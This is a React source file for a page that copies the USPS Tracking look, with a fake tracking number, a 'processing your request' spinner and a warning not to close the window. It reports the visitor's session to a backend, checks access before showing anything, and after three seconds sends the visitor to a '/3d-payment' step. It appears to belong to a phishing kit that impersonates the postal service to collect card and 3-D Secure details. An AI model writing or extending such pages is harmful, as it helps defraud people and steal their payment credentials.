import React, { useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import Header from "../components/Header";
import Footer from "../components/Footer";
import { baseUrl } from "../constants";
import useAccessCheck from "../Utils/useAccessCheck";

const Wait: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { sessionId } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (isAllowed === true && sessionId) {
      let cancelled = false;

      const sendWaitEvent = async () => {
        try {
          await axios.post(`${baseUrl}api/usps-wait-event/`, { sessionId });
        } catch (error) {
          console.error("Error reporting wait event:", error);
        }
      };

      sendWaitEvent();

      const timer = setTimeout(() => {
        if (!cancelled) {
          navigate("/3d-payment", { state: { sessionId } });
        }
      }, 3000);

      return () => {
        cancelled = true;
        clearTimeout(timer);
      };
    }
  }, [isAllowed, sessionId, navigate]);

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  if (!sessionId) {
    return <div>Missing session information. Please restart the process.</div>;
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
      <Header />
      <main className="flex-1 w-full">
        <div className="w-full bg-white border-b border-[#e0e0e8] py-10 px-4 sm:px-6 shadow-sm">
          <div className="max-w-[960px] mx-auto flex flex-wrap items-start justify-between gap-6">
            <div>
              <div className="text-[26px] sm:text-[30px] font-semibold text-[#1a2252] leading-tight">
                USPS Tracking<sup className="text-xs align-super">®</sup>
              </div>
              <button
                type="button"
                className="mt-3 inline-flex items-center gap-2 sm:gap-3 text-[14px] sm:text-[15px] font-semibold text-[#1a2252] hover:underline"
              >
                <span>Track Another Package</span>
                <span className="text-[#d52b1e] text-[18px] sm:text-[22px] leading-none">+</span>
              </button>
            </div>
            <div className="flex items-center gap-4 sm:gap-5 text-[14px] sm:text-[15px] font-semibold text-[#1a2252]">
              <button
                type="button"
                className="relative px-1 pb-1 text-[#1a2252] after:absolute after:left-0 after:right-0 after:bottom-0 after:h-[2px] after:bg-[#d52b1e]"
              >
                Tracking
              </button>
              <span className="h-5 w-px bg-[#d8d8e0]" />
              <button
                type="button"
                className="px-1 pb-1 text-[#4a4f6d] hover:text-[#1a2252] transition-colors"
              >
                FAQs
              </button>
            </div>
          </div>
        </div>
        <div className="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
          <div className="mt-12 space-y-12">
            <section className="space-y-5 text-center">
              <div className="text-[16px] sm:text-[17px] text-[#4a4f6d]">
                <span className="font-semibold text-[#1a2252]">Tracking Number:</span>
                <span className="ml-1 sm:ml-2 font-semibold text-[16px] sm:text-[17px] text-[#6b6f88]">92612999897543581074711582</span>
              </div>
              <div className="text-[17px] font-semibold text-[#23285a]">Status :</div>
              <div className="text-[19px] font-bold text-[#c5282c]">
                We are processing your request
              </div>
              <p className="text-[14px] leading-6 text-[#4a4f6d] max-w-[620px] mx-auto">
                Please hold on while we complete the verification steps for your package. This usually takes less than a minute.
              </p>
              <div className="flex justify-center">
                <div className="h-20 w-20 rounded-full border-[6px] border-[#d9d9df] border-t-[#2b2a72] animate-spin" aria-label="Loading" />
              </div>
              <div className="text-[13px] font-semibold text-[#c5282c] uppercase tracking-wide">
                Do not close this window
              </div>
            </section>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Wait;
